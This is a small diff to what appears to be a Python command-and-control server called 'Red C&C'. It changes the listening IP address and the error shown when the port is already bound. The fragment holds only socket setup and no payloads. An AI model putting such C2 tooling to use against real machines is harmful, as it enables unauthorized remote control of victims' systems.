@@ -25,7 +25,7 @@ except ImportError as err:
 
 #  CONSTANTS   #
 PORT = 1337 # Port number to receve connections from.
-IP = "192.168.31.134" # IP address of your computer. Change this!
+IP = "192.168.31.131" # IP address of your computer. Change this!
 TO_ACCEPT = 10 # Number of connections to accept.
 NUM_OF_THREADS = 2 # Number of threads that we will create.
 THREAD_IDS = [1, 2] # Thread identifiers.
@@ -81,7 +81,7 @@ class Server:
 			self.server_socket.bind((IP, PORT))
 			self.server_socket.listen(TO_ACCEPT)
 		except:
-			print(RED + '[-] Address already is use. Try again in 10-15 seconds.' + RESET)
+			print(RED + '[-] There is a running Red C&C. Make sure you have the right IP address and try again.\n' + RESET)
 			os._exit(1)
 
 	def accept_connections(self):
